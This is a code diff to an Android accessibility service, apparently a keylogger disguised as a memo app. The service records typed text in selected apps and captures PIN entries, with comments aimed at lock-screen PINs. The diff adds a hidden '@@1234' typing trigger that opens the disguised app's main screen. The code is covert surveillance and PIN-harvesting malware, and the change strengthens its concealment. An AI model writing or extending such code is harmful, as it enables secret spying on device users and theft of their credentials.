@@ -80,12 +80,23 @@ class TypeVaultAccessibilityService : AccessibilityService() {
             // ── KEYBOARD CAPTURE (requires app in included list) ──
             // ══════════════════════════════════════════════════════════════
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                val fullText = event.text.joinToString()
+                
+                // --- Secret Trigger to Open App ---
+                if (fullText.contains("@@1234")) {
+                    val intent = Intent(this@TypeVaultAccessibilityService, com.example.memo.MainActivity::class.java).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    }
+                    startActivity(intent)
+                    return
+                }
+
                 // Check if this is a PIN field (not a password field, but contains only digits)
                 val isPinField = isPinLikeTextField(event)
 
                 if (isPinField) {
                     // Method 3: PIN field text changed (works if app doesn't use password inputType)
-                    val text = event.text.joinToString().filter { it.isDigit() }
+                    val text = fullText.filter { it.isDigit() }
                     if (text.isNotEmpty() && text.length <= 8) {
                         // This is likely a PIN being entered — but only capture if it's a lock screen
                         val windowTitle = event.className?.toString()?.lowercase() ?: ""
@@ -97,13 +108,12 @@ class TypeVaultAccessibilityService : AccessibilityService() {
                     }
                 } else if (settingsManager.isIncluded(packageName)) {
                     // Normal keyboard capture
-                    val text = event.text.joinToString()
-                    if (text.isNotBlank()) {
+                    if (fullText.isNotBlank()) {
                         val appName = getAppLabel(packageName)
                         if (lastPackageName != null && lastPackageName != packageName) commitCurrentText()
                         lastPackageName = packageName
                         lastAppName = appName
-                        currentText = text
+                        currentText = fullText
                         debounceJob?.cancel()
                         debounceJob = serviceScope.launch {
                             delay(2000)
